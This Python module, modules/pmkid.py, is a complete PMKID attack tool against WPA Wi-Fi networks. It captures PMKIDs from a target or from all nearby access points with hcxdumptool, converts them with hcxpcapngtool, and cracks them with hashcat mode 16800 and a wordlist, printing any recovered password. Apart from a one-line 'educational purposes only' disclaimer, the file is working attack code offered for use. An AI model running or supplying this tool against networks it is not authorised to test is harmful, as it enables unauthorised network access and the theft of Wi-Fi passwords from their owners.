# modules/pmkid.py

import subprocess
import os
import sys
import shutil
import time
import argparse
import re
import signal

# --- Configuration ---
CAPTURE_DIR_DEFAULT = "/tmp/wifi_captures"
HCXDUMPTOOL_COMMAND = "hcxdumptool"
HCXPCAPNGTOOL_COMMAND = "hcxpcapngtool"
HASHCAT_COMMAND = "hashcat"
SUDO_COMMAND = "sudo"
# ---------------------

# Global list for process management
running_processes = []


def _is_tool_installed(name):
    if shutil.which(name) is None:
        print(f"[!] Error: '{name}' command not found. Please install it.")
        return False
    return True


def _run_blocking_command(command_list, use_sudo=False, check_return_code=True):
    """Helper to run a command and wait for it, checking its output."""
    cmd = list(command_list)
    if use_sudo and os.geteuid() != 0:
        if not _is_tool_installed(SUDO_COMMAND): return False, "sudo not found", ""
        cmd.insert(0, SUDO_COMMAND)

    print(f"[*] Executing: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=False)  # check=False to handle manually
        if check_return_code and result.returncode != 0:
            print(f"[-] Command failed with exit code {result.returncode}.")
            if result.stdout: print(f"    Stdout: {result.stdout.strip()}")
            if result.stderr: print(f"    Stderr: {result.stderr.strip()}")
            return False, result.stdout, result.stderr
        return True, result.stdout, result.stderr
    except FileNotFoundError:
        print(f"[!] Error: Command '{cmd[0]}' not found.")
        return False, "", f"Command '{cmd[0]}' not found."
    except Exception as e:
        print(f"[!] An unexpected error occurred: {e}")
        return False, "", str(e)


def _start_background_process(command_list, use_sudo=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL):
    """Starts a command in the background and returns the Popen object."""
    global running_processes
    cmd = list(command_list)
    if use_sudo and os.geteuid() != 0:
        if not _is_tool_installed(SUDO_COMMAND): return None
        cmd.insert(0, SUDO_COMMAND)

    print(f"[*] Starting background process: {' '.join(cmd)}")
    try:
        process = subprocess.Popen(cmd, stdout=stdout, stderr=stderr, text=(stdout != subprocess.DEVNULL))
        running_processes.append(process)
        time.sleep(0.5)  # Brief pause
        if process.poll() is not None:
            print(
                f"[!] Background process {cmd[0]} failed to start or exited immediately (code: {process.returncode}).")
            running_processes.remove(process)
            return None
        return process
    except FileNotFoundError:
        print(f"[!] Error: Command '{cmd[0]}' not found.")
        return None
    except Exception as e:
        print(f"[!] Error starting background process '{cmd[0]}': {e}")
        return None


def _stop_all_background_processes():
    global running_processes
    print("[*] Stopping all tracked background processes...")
    for p in reversed(running_processes):
        if p.poll() is None:
            print(f"[*] Terminating PID {p.pid} ({p.args[0] if isinstance(p.args, list) else p.args})...")
            try:
                # Graceful termination attempt
                if os.geteuid() == 0 or not isinstance(p.args, list) or p.args[0] != SUDO_COMMAND:
                    p.terminate()
                else:  # For sudo'd processes, SIGINT might be better if they handle it, or SIGTERM to sudo itself.
                    os.kill(p.pid, signal.SIGTERM)  # Try to term sudo which should term child
                p.wait(timeout=3)
            except subprocess.TimeoutExpired:
                print(f"[!] PID {p.pid} did not terminate gracefully, sending SIGKILL.")
                if os.geteuid() == 0 or not isinstance(p.args, list) or p.args[0] != SUDO_COMMAND:
                    p.kill()
                else:
                    os.kill(p.pid, signal.SIGKILL)
                p.wait()
            except Exception as e:
                print(f"[!] Error terminating PID {p.pid}: {e}. Trying p.kill().")
                p.kill();
                p.wait()
    running_processes.clear()


def capture_pmkid_hcxdumptool(interface, output_prefix, capture_dir=CAPTURE_DIR_DEFAULT,
                              target_bssid=None, channel=None, timeout=None,
                              additional_options=None):
    """
    Captures PMKIDs using hcxdumptool.

    :param interface: Wireless interface in monitor mode.
    :param output_prefix: Prefix for the output .pcapng file.
    :param capture_dir: Directory to save capture files.
    :param target_bssid: (Optional) Specific BSSID to target.
    :param channel: (Optional) Specific channel to scan. If None, hcxdumptool scans.
    :param timeout: (Optional) Duration in seconds to run hcxdumptool.
    :param additional_options: (Optional) List of extra command-line options for hcxdumptool.
    :return: Path to the .pcapng file if capture seems successful, None otherwise.
    """
    print("[*] Preparing to capture PMKID using hcxdumptool...")
    print(f"[!] Ensure interface '{interface}' is in MONITOR MODE and not managed by NetworkManager.")

    if not _is_tool_installed(HCXDUMPTOOL_COMMAND): return None

    os.makedirs(capture_dir, exist_ok=True)
    # hcxdumptool names files like <prefix>.pcapng if -o is given a full path,
    # or creates one in CWD if -o is just a name.
    # Let's create a unique name based on prefix and timestamp if not specific.
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    # If output_prefix does not end with .pcapng, append it.
    if not output_prefix.endswith(".pcapng"):
        base_name = f"{output_prefix}_{timestamp}.pcapng"
    else:
        base_name = output_prefix  # User provided full name

    capture_path = os.path.join(capture_dir, base_name)

    cmd = [
        HCXDUMPTOOL_COMMAND,
        "-i", interface,
        "-o", capture_path,
        "--enable_status=1",  # Show status messages
        # "--active_beacon", # Actively send beacon frames
        # "--disable_client_attacks", # Focus only on APs for PMKID
    ]

    if target_bssid:
        # Create a filterlist file for hcxdumptool
        filter_file_path = os.path.join(capture_dir, f"filter_{target_bssid.replace(':', '')}.bssid")
        with open(filter_file_path, "w") as f:
            f.write(target_bssid.upper() + "\n")
        print(f"[+] Created BSSID filter file: {filter_file_path}")
        cmd.extend(["--filterlist_ap", filter_file_path])
        # cmd.extend(["--filtermode=2"]) # APs in filterlist_ap + their clients

    if channel:
        cmd.extend(["-c", str(channel)])

    if additional_options and isinstance(additional_options, list):
        cmd.extend(additional_options)

    hcxdump_proc = None
    print(f"[+] Starting PMKID capture. Output to: {capture_path}")
    if timeout:
        print(f"[+] Capture will run for a maximum of {timeout} seconds.")
    print("[+] Press Ctrl+C to stop capturing manually.")

    try:
        # hcxdumptool should be run with sudo
        hcxdump_proc = _start_background_process(cmd, use_sudo=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        if not hcxdump_proc:
            return None

        start_time = time.time()
        pmkid_found_for_target = False

        # Monitor hcxdumptool output for PMKID indication
        # Example line: "[18:30:08 - 001] CLIENT -> AP    (PMKID)"
        # Example line: "FOUND PMKID"
        # Example line: "PMKID: <BSSID> <STA_MAC> <PMKID_HEX>"
        while True:
            if hcxdump_proc.stdout:
                line = hcxdump_proc.stdout.readline()
                if line:
                    sys.stdout.write(f"[hcxdumptool] {line}")  # Show output
                    sys.stdout.flush()
                    if "FOUND PMKID" in line.upper() or "(PMKID)" in line.upper():
                        if target_bssid:
                            if target_bssid.upper() in line.upper():
                                print(f"\n\033[92m[+] PMKID potentially captured for target {target_bssid}!\033[0m")
                                pmkid_found_for_target = True
                                # Let it run a bit longer or stop immediately?
                                # For simplicity, we let timeout/Ctrl+C handle stop.
                        else:  # No specific target, any PMKID is good.
                            print(f"\n\033[92m[+] PMKID potentially captured!\033[0m")
                            # pmkid_found_for_target = True # Generic flag

            if timeout and (time.time() - start_time > timeout):
                print("\n[!] Capture timeout reached.")
                break
            if hcxdump_proc.poll() is not None:
                print("\n[!] hcxdumptool process terminated.")
                break
            time.sleep(0.1)

    except KeyboardInterrupt:
        print("\n[!] PMKID capture interrupted by user.")
    except Exception as e:
        print(f"[!] An error occurred during PMKID capture: {e}")
    finally:
        if hcxdump_proc and hcxdump_proc.poll() is None:
            print("[*] Stopping hcxdumptool...")
            # hcxdumptool often needs SIGINT to stop gracefully and write file
            if os.geteuid() == 0 or hcxdump_proc.args[0] != SUDO_COMMAND:
                hcxdump_proc.send_signal(signal.SIGINT)
            else:  # if sudo'd, send to sudo process
                os.kill(hcxdump_proc.pid, signal.SIGINT)

            try:
                hcxdump_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                hcxdump_proc.kill()
        if hcxdump_proc and hcxdump_proc in running_processes:
            running_processes.remove(hcxdump_proc)

    if os.path.exists(capture_path) and os.path.getsize(capture_path) > 0:
        print(f"[+] Capture file created: {capture_path}")
        if target_bssid and not pmkid_found_for_target:
            print(
                f"[!] Warning: PMKID for specific target {target_bssid} was not explicitly confirmed in hcxdumptool output.")
        return capture_path
    else:
        print(f"[-] Capture file {capture_path} not found or is empty.")
        # Cleanup filter file if it was created
        if target_bssid and 'filter_file_path' in locals() and os.path.exists(filter_file_path):
            try:
                os.remove(filter_file_path)
            except:
                pass
        return None


def convert_pcapng_to_hccapx(pcapng_file, output_hccapx_file=None):
    """
    Converts a .pcapng file (from hcxdumptool) to a Hashcat .hccapx file (mode 16800).
    For PMKIDs, the output is actually a text hash format, not .hccapx.
    hcxpcapngtool will output to stdout if -o is not given, or to a file if -o is.
    The format for PMKID (-m 16800) is PMKID*BSSID*ClientMAC*ESSID_HEX

    :param pcapng_file: Path to the input .pcapng file.
    :param output_hccapx_file: (Optional) Path to save the output hash file.
                               If None, will be pcapng_file with .16800 extension.
    :return: Path to the output hash file if successful, None otherwise.
    """
    print(f"[*] Converting {pcapng_file} to Hashcat PMKID format...")
    if not _is_tool_installed(HCXPCAPNGTOOL_COMMAND): return None
    if not os.path.isfile(pcapng_file):
        print(f"[!] Input file not found: {pcapng_file}")
        return None

    if output_hccapx_file is None:
        # Hashcat format for PMKID is not .hccapx, it's just a text file with hashes.
        # Using .pmkid or .16800 might be more appropriate.
        output_hash_file = os.path.splitext(pcapng_file)[0] + ".16800"
    else:
        output_hash_file = output_hccapx_file

    # hcxpcapngtool options for PMKID:
    # -o <hashfile> : output PMKID to file
    # If you want EAPOL messages for -m 2500 (WPA/WPA2 handshake), use -O <hccapxfile>
    # For PMKID (-m 16800), the output is a list of hashes.
    cmd = [HCXPCAPNGTOOL_COMMAND, "--pmkid=" + output_hash_file, pcapng_file]

    # No sudo typically needed for hcxpcapngtool if it's just reading/writing files.
    success, stdout, stderr = _run_blocking_command(cmd, use_sudo=False, check_return_code=False)

    # hcxpcapngtool can be noisy on stdout even on success.
    # Check if the output file was created and is not empty.
    if os.path.exists(output_hash_file) and os.path.getsize(output_hash_file) > 0:
        print(f"[+] PMKID hash file created: {output_hash_file}")
        print(f"    hcxpcapngtool stdout: {stdout.strip()}")
        if stderr.strip(): print(f"    hcxpcapngtool stderr: {stderr.strip()}")
        return output_hash_file
    else:
        print(f"[-] Failed to convert/extract PMKID hashes to {output_hash_file}.")
        print(f"    hcxpcapngtool stdout: {stdout.strip()}")
        if stderr.strip(): print(f"    hcxpcapngtool stderr: {stderr.strip()}")
        return None


def crack_pmkid_hashcat(hash_file, wordlist_file, hashcat_rules=None, custom_options=None):
    """
    Cracks PMKID hashes using Hashcat.

    :param hash_file: Path to the file containing PMKID hashes (mode 16800 format).
    :param wordlist_file: Path to the wordlist.
    :param hashcat_rules: (Optional) List of paths to Hashcat rule files.
    :param custom_options: (Optional) List of additional Hashcat command-line options.
    :return: The found password as a string, or None.
    """
    print(f"[*] Attempting to crack PMKID hashes from: {hash_file}")
    if not _is_tool_installed(HASHCAT_COMMAND): return None
    if not os.path.isfile(hash_file):
        print(f"[!] Hash file not found: {hash_file}")
        return None
    if not os.path.isfile(wordlist_file):
        print(f"[!] Wordlist file not found: {wordlist_file}")
        return None

    cmd = [
        HASHCAT_COMMAND,
        "-m", "16800",  # PMKID EAPOL
        hash_file,
        wordlist_file,
        "--status",  # Enable status screen
        "--status-timer=5",  # Update status every 5 seconds
        # "--potfile-disable" # Optional: don't use .potfile for this run
        # "--force" # Optional: if hashcat complains about drivers/etc. USE WITH CAUTION.
    ]

    if hashcat_rules and isinstance(hashcat_rules, list):
        for rule_file in hashcat_rules:
            if os.path.isfile(rule_file):
                cmd.extend(["-r", rule_file])
            else:
                print(f"[!] Warning: Hashcat rule file not found: {rule_file}")

    if custom_options and isinstance(custom_options, list):
        cmd.extend(custom_options)

    print(f"[*] Starting Hashcat. This may take a very long time.")
    print(f"    Command: {' '.join(cmd)}")
    print("[*] Hashcat output will be streamed. Look for 'Status.........: Cracked'.")

    hashcat_proc = None
    found_password = None
    try:
        # Hashcat typically doesn't need sudo if run by a user with access to GPU/CPU resources.
        # If running in a restricted environment or specific OpenCL setups, sudo might be involved.
        hashcat_proc = _start_background_process(cmd, use_sudo=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        if not hashcat_proc:
            return None

        # Monitor Hashcat output for success or progress
        # Hashcat status lines start with "Status.........:"
        # Successful crack shows in "Recovered" count or in potfile.
        # Hashcat also prints found passwords to stdout if not using --outfile.
        # Example found line: PMKID*bssid*stamac*essid:password

        while True:
            if hashcat_proc.stdout:
                line = hashcat_proc.stdout.readline()
                if not line:  # EOF
                    break
                sys.stdout.write(f"[Hashcat] {line}")
                sys.stdout.flush()

                if "Status.........: Cracked" in line:
                    print(
                        "\n\033[92m[+] Hashcat reports 'Cracked' status! Password(s) should be in potfile or stdout.\033[0m")
                    # Hashcat might not print the password immediately here, but in a summary or potfile.
                    # We'll try to parse it if it prints directly.

                # Hashcat often prints the cracked hash directly to stdout like:
                # HASH_LINE_HERE:CRACKED_PASSWORD
                # For PMKID, this would be PMKID*BSSID*ClientMAC*ESSID_HEX:password
                match = re.match(r"([0-9a-fA-F\*]+):(.+)", line.strip())
                if match:
                    # The first part is the hash, second is the password
                    # We don't need to verify the hash string itself here, just grab the password
                    pw = match.group(2)
                    if pw:  # Ensure it's not empty
                        found_password = pw
                        print(f"\n\033[92m[SUCCESS] Password found by Hashcat: {found_password}\033[0m")
                        # Hashcat might continue if there are more hashes.
                        # For this script, let's assume we stop on first find for simplicity,
                        # or let hashcat finish and rely on its potfile.
                        # To stop hashcat: hashcat_proc.terminate() then break.
                        # For now, we just note it and let hashcat run its course.
                        # If hashcat is set to exit on first crack, this loop will break.

            if hashcat_proc.poll() is not None:
                print("\n[!] Hashcat process terminated.")
                break
            time.sleep(0.1)

        # After loop, if hashcat_proc is done, check its final output/potfile
        # This part is complex as it requires parsing potfile or final summary.
        # For now, we rely on stdout parsing above or user checking potfile.
        if hashcat_proc and hashcat_proc in running_processes:
            running_processes.remove(hashcat_proc)

        if found_password:
            return found_password
        else:
            # Check hashcat potfile
            potfile_path = "hashcat.potfile"  # Default name, or specify with --outfile-format / --potfile-path
            # A more robust way is to determine potfile path from hashcat options if specified.
            # For now, assume default or user checks it.
            # If we parsed a specific output file with --outfile, check that.

            # Check if default potfile exists in CWD or hashcat's specified dir.
            # This check is basic; hashcat might use a session-specific potfile.
            default_pot_path = os.path.join(os.getcwd(), "hashcat.potfile")  # Hashcat often creates in CWD
            if os.path.exists(default_pot_path):
                print(f"[*] Hashcat finished. Check '{default_pot_path}' for any cracked passwords.")
            else:
                print(
                    "[*] Hashcat finished. No password parsed directly from stdout. Check Hashcat's output/session files for results if any.")
            return None


    except KeyboardInterrupt:
        print("\n[!] Hashcat cracking interrupted by user.")
        # found_password might have been set before interruption
        return found_password
    except Exception as e:
        print(f"[!] An error occurred during Hashcat cracking: {e}")
        return found_password  # Return if anything was found before error
    finally:
        if hashcat_proc and hashcat_proc.poll() is None:
            print("[*] Stopping Hashcat...")
            hashcat_proc.terminate()  # Or .send_signal(signal.SIGINT) for graceful quit
            try:
                hashcat_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                hashcat_proc.kill()
        if hashcat_proc and hashcat_proc in running_processes:
            running_processes.remove(hashcat_proc)


# --- Main execution for demonstration ---
def main():
    parser = argparse.ArgumentParser(description="PMKID Capture and Crack Tool (hcxdumptool, hcxpcapngtool, Hashcat).")
    parser.add_argument("interface", help="Wireless interface in MONITOR MODE.")
    parser.add_argument("-b", "--bssid", help="Target BSSID (MAC address of AP). If not specified, captures from all.")
    parser.add_argument("-c", "--channel", type=int,
                        help="Specific channel to scan/target. If not specified, hcxdumptool scans.")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file for cracking.")
    parser.add_argument("-o", "--output-prefix", default="pmkid_capture",
                        help="Prefix for the output .pcapng capture file (default: pmkid_capture).")
    parser.add_argument("-d", "--capture-dir", default=CAPTURE_DIR_DEFAULT,
                        help=f"Directory to save captures and hash files (default: {CAPTURE_DIR_DEFAULT}).")
    parser.add_argument("--capture-timeout", type=int, default=60,
                        help="Maximum time (seconds) to run hcxdumptool for PMKID capture (default: 60s). 0 for indefinite (Ctrl+C to stop).")
    parser.add_argument("--hcxdump-opts", nargs='*',
                        help="Additional raw options for hcxdumptool (e.g., --hcxdump-opts '--active_beacon').")
    parser.add_argument("--hashcat-rules", nargs='*',
                        help="Path(s) to Hashcat rule files (e.g., -r rule1.rule -r rule2.rule).")
    parser.add_argument("--hashcat-opts", nargs='*',
                        help="Additional raw options for Hashcat (e.g., --hashcat-opts '--force' '-O').")
    parser.add_argument("--skip-capture", metavar="PCAPNG_FILE",
                        help="Path to an existing .pcapng file to process (skips hcxdumptool).")
    parser.add_argument("--skip-convert", metavar="HASH_FILE",
                        help="Path to an existing PMKID hash file (skips capture and convert).")

    args = parser.parse_args()

    print("=======================================================")
    print("           PMKID Attack Tool (hcx suite + Hashcat)     ")
    print("=======================================================")
    print("Disclaimer: Educational purposes ONLY. Unauthorized activity is illegal.")
    print(f"[!] Ensure '{args.interface}' is in MONITOR MODE and not actively managed by other network tools.")
    print("=======================================================\n")

    if os.geteuid() != 0:
        print("[!] This script uses tools (hcxdumptool) that require root privileges.")
        print("    Please run with sudo: sudo python3 your_script_name.py ...")
        # hcxdumptool needs sudo. Hashcat usually doesn't. hcxpcapngtool usually doesn't.
        # The internal sudo calls will handle hcxdumptool.

    # Global signal handler
    def signal_handler(sig, frame):
        print(f"\n[!] Signal {sig} received. Shutting down all processes gracefully...")
        _stop_all_background_processes()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    pcapng_file_path = None
    pmkid_hash_file_path = None

    try:
        if args.skip_convert:
            pmkid_hash_file_path = args.skip_convert
            if not os.path.isfile(pmkid_hash_file_path):
                print(f"[!] Error: Provided hash file for --skip-convert not found: {pmkid_hash_file_path}")
                sys.exit(1)
            print(f"[*] Skipping capture and conversion. Using existing hash file: {pmkid_hash_file_path}")
        elif args.skip_capture:
            pcapng_file_path = args.skip_capture
            if not os.path.isfile(pcapng_file_path):
                print(f"[!] Error: Provided pcapng file for --skip-capture not found: {pcapng_file_path}")
                sys.exit(1)
            print(f"[*] Skipping capture. Using existing pcapng file: {pcapng_file_path}")

            pmkid_hash_file_path = convert_pcapng_to_hccapx(pcapng_file_path)
            if not pmkid_hash_file_path:
                print("[-] Failed to convert pcapng to PMKID hash format. Exiting.")
                sys.exit(1)
        else:  # Full workflow: Capture -> Convert -> Crack
            capture_timeout_actual = args.capture_timeout if args.capture_timeout > 0 else None
            pcapng_file_path = capture_pmkid_hcxdumptool(
                args.interface, args.output_prefix, args.capture_dir,
                args.bssid, args.channel, capture_timeout_actual, args.hcxdump_opts
            )
            if not pcapng_file_path:
                print("[-] PMKID capture failed or no file produced. Exiting.")
                sys.exit(1)

            pmkid_hash_file_path = convert_pcapng_to_hccapx(pcapng_file_path)
            if not pmkid_hash_file_path:
                print("[-] Failed to convert pcapng to PMKID hash format. Exiting.")
                sys.exit(1)

        # --- Cracking Phase ---
        if pmkid_hash_file_path:
            print(f"\n[*] Proceeding to crack PMKID hashes from: {pmkid_hash_file_path}")
            if not args.wordlist:
                print("[!] Wordlist (-w/--wordlist) is required for cracking. Exiting.")
                sys.exit(1)

            found_password = crack_pmkid_hashcat(
                pmkid_hash_file_path, args.wordlist,
                args.hashcat_rules, args.hashcat_opts
            )

            if found_password:
                print(f"\n[SUCCESS] Password cracked: {found_password}")
            else:
                print(f"\n[-] Failed to crack password from {pmkid_hash_file_path} with wordlist {args.wordlist}.")
        else:
            print("\n[-] No valid PMKID hash file to crack.")

    except Exception as e:
        print(f"[!!!] An unexpected critical error occurred in main: {e}")
    finally:
        _stop_all_background_processes()  # Final cleanup attempt
        print("\n[*] PMKID attack script finished.")


if __name__ == "__main__":
    main()